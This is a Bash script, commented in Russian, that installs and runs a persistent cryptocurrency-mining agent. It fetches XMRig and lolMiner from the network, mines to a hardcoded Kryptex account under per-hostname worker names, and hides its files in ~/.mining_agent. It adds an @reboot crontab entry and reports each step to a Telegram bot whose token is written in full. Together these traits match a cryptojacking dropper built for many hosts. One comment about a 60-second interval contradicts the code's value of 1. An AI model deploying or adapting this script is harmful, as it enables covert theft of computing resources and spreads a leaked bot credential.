#!/bin/bash
# MINING AGENT — UNIVERSAL EDITION
# Compatible: Debian/Ubuntu/CentOS/Alpine/Arch
# Error handling & Telemetry included

set -euo pipefail

# ===== CONFIG (User Provided) =====
ALLOW_MINING="${ALLOW_MINING:-1}"
[ "$ALLOW_MINING" = "1" ] || exit 0

HOSTNAME_SAFE="$(hostname | tr -cd '[:alnum:]._\-')"
INTERVAL=1  # Увеличил до 60с, чтобы не спамить API и дать майнерам время на старт

# TELEGRAM (Твои данные)
TG_TOKEN="7707664730:AAFn_w7oN_LvELjXhh8RRAzq7CO0acaHy1M"
TG_CHAT="5336452267"
TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"

# MINING CONFIG
KRIPTEX="krxX3PVQVR"
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# PATHS
BASE="${HOME}/.mining_agent"
BIN="${BASE}/bin"
RUN="${BASE}/run"
LOG="${BASE}/log"
mkdir -p "${BIN}/cpu" "${BIN}/gpu" "${RUN}" "${LOG}"

# ===== UTILS: Cross-distro Compatibility =====

# Универсальный загрузчик: пробуем curl, если нет — wget
fetch_file() {
    local url="$1"
    local out="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --connect-timeout 15 --max-time 120 "$url" -o "$out" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -q --timeout=15 --tries=2 "$url" -O "$out" 2>/dev/null
    else
        return 1
    fi
}

# Отправка в ТГ с обработкой ошибок сети
tg_send() {
    local msg="🖥 [${HOSTNAME_SAFE}] $1"
    # Пытаемся отправить, но не крашим скрипт, если ТГ недоступен
    if command -v curl >/dev/null 2>&1; then
        curl -s --connect-timeout 10 --max-time 15 \
            -X POST "${TG_API}" \
            -d chat_id="${TG_CHAT}" \
            --data-urlencode text="${msg}" >/dev/null 2>&1 || true
    elif command -v wget >/dev/null 2>&1; then
        wget -q --post-data="chat_id=${TG_CHAT}&text=${msg}" \
            "${TG_API}" >/dev/null 2>&1 || true
    fi
}

# Проверка, жив ли процесс по PID
is_alive() {
    local pid="$1"
    [ -n "$pid" ] && [ -d "/proc/${pid}" ] && kill -0 "${pid}" 2>/dev/null
}

# ===== INSTALLERS =====

install_xmrig() {
    tg_send "📦 Установка XMRig..."
    pkill -9 xmrig 2>/dev/null || true
    rm -f "${BIN}/cpu/xmrig"

    # Версии и зеркала
    local urls=(
        "https://xmrig.com/download/xmrig-6.25.0-linux-static-x64.tar.gz"
        "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
    )

    for url in "${urls[@]}"; do
        if fetch_file "$url" "/tmp/xmrig.tgz"; then
            if tar -xzf /tmp/xmrig.tgz -C "${BIN}/cpu" --strip-components=1 2>/dev/null; then
                chmod +x "${BIN}/cpu/xmrig"
                if "${BIN}/cpu/xmrig" --version >/dev/null 2>&1; then
                    tg_send "✅ XMRig установлен успешно"
                    rm -f /tmp/xmrig.tgz
                    return 0
                fi
            fi
        fi
    done
    tg_send "❌ Ошибка установки XMRig (сеть/архив/права)"
    return 1
}

install_lolminer() {
    tg_send "📦 Установка lolMiner..."
    pkill -9 lolMiner 2>/dev/null || true
    rm -f "${BIN}/gpu/lolMiner"

    local url="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
    
    if fetch_file "$url" "/tmp/lolminer.tgz"; then
        if tar -xzf /tmp/lolminer.tgz -C "${BIN}/gpu" --strip-components=1 2>/dev/null; then
            chmod +x "${BIN}/gpu/lolMiner"
            if "${BIN}/gpu/lolMiner" --version >/dev/null 2>&1; then
                tg_send "✅ lolMiner установлен успешно"
                rm -f /tmp/lolminer.tgz
                return 0
            fi
        fi
    fi
    tg_send "❌ Ошибка установки lolMiner"
    return 1
}

# ===== RUNNERS =====

start_cpu() {
    tg_send "🚀 Запуск CPU майнинга..."
    # Kill old if exists
    if [ -f "${RUN}/cpu.pid" ] && is_alive "$(cat "${RUN}/cpu.pid")"; then
        kill "$(cat "${RUN}/cpu.pid")" 2>/dev/null || true
    fi
    
    # Start new
    nohup "${BIN}/cpu/xmrig" \
        -o "${XMR_POOL}" \
        -u "${KRIPTEX}.${HOSTNAME_SAFE}" -p x \
        --http-enabled --http-host 127.0.0.1 --http-port 16000 \
        --donate-level 1 \
        >> "${LOG}/cpu.log" 2>&1 &
    echo $! > "${RUN}/cpu.pid"
    sleep 2
    is_alive "$(cat "${RUN}/cpu.pid")"
}

start_gpu() {
    tg_send "🚀 Запуск GPU майнинга..."
    if [ -f "${RUN}/gpu.pid" ] && is_alive "$(cat "${RUN}/gpu.pid")"; then
        kill "$(cat "${RUN}/gpu.pid")" 2>/dev/null || true
    fi

    nohup "${BIN}/gpu/lolMiner" \
        --algo ETCHASH \
        --pool "${ETC_POOL}" \
        --user "${KRIPTEX}.${HOSTNAME_SAFE}" \
        --ethstratum ETCPROXY \
        --apihost 127.0.0.1 --apiport 8080 \
        --watchdog exit \
        >> "${LOG}/gpu.log" 2>&1 &
    echo $! > "${RUN}/gpu.pid"
    sleep 2
    is_alive "$(cat "${RUN}/gpu.pid")"
}

# ===== TELEMETRY =====

get_hashrate() {
    local port="$1"
    local val
    val=$(curl -s --max-time 3 "http://127.0.0.1:${port}/1/summary" 2>/dev/null | grep -oE '"hps":[0-9.]+' | grep -oE '[0-9.]+' | head -1)
    echo "${val:-0}"
}

# ===== AUTOSTART (Safe Cron) =====

setup_autostart() {
    # Проверяем, есть ли уже задача
    if crontab -l 2>/dev/null | grep -q "min1.sh"; then
        return 0
    fi
    
    # Пытаемся добавить, но только если cron доступен
    if command -v crontab >/dev/null 2>&1; then
        local cron_job="@reboot sleep 30 && ALLOW_MINING=1 ${BASE}/min1.sh >> ${LOG}/boot.log 2>&1"
        # Безопасное добавление: читаем текущее, добавляем новое, пишем обратно
        (crontab -l 2>/dev/null; echo "$cron_job") | crontab - 2>/dev/null && \
        tg_send "⚙️ Автозапуск добавлен в crontab" || \
        tg_send "⚠️ Не удалось обновить crontab (нет прав?)"
    else
        tg_send "⚠️ Crontab не найден, автозапуск пропущен"
    fi
}

# ===== MAIN LOGIC =====

main() {
    tg_send "🔄 Старт агента на ${HOSTNAME_SAFE}..."

    local cpu_ok=0
    local gpu_ok=0

    # 1. Установка
    install_xmrig && cpu_ok=1
    install_lolminer && gpu_ok=1

    # 2. Автозапуск
    setup_autostart

    # 3. Запуск процессов
    [ "$cpu_ok" = "1" ] && start_cpu && tg_send "▶️ CPU запущен" || tg_send "⛔ CPU не запущен"
    [ "$gpu_ok" = "1" ] && start_gpu && tg_send "▶️ GPU запущен" || tg_send "⛔ GPU не запущен"

    # 4. Итоговый отчет
    if [ "$cpu_ok" = "0" ] && [ "$gpu_ok" = "0" ]; then
        tg_send "🔥 КРИТИЧЕСКАЯ ОШИБКА: Майнинг не запущен!"
        exit 1
    fi

    tg_send "✅ Агент работает (CPU:${cpu_ok} GPU:${gpu_ok})"
}

# ===== WATCHDOG LOOP =====

watchdog() {
    while true; do
        # Проверка CPU
        if [ -f "${RUN}/cpu.pid" ]; then
            pid=$(cat "${RUN}/cpu.pid")
            if ! is_alive "$pid"; then
                tg_send "⚠️ CPU процесс упал! Перезапуск..."
                start_cpu
            fi
        fi

        # Проверка GPU
        if [ -f "${RUN}/gpu.pid" ]; then
            pid=$(cat "${RUN}/gpu.pid")
            if ! is_alive "$pid"; then
                tg_send "⚠️ GPU процесс упал! Перезапуск..."
                start_gpu
            else
                # Проверка хешрейта (если упал в 0, возможно, отвал драйвера)
                hr=$(get_hashrate 8080 | cut -d. -f1)
                if [ -n "$hr" ] && [ "$hr" = "0" ]; then
                     tg_send "⚠️ GPU хешрейт = 0. Перезапуск..."
                     start_gpu
                fi
            fi
        fi
        
        sleep "$INTERVAL"
    done
}

# ===== ENTRY POINT =====
main
watchdog
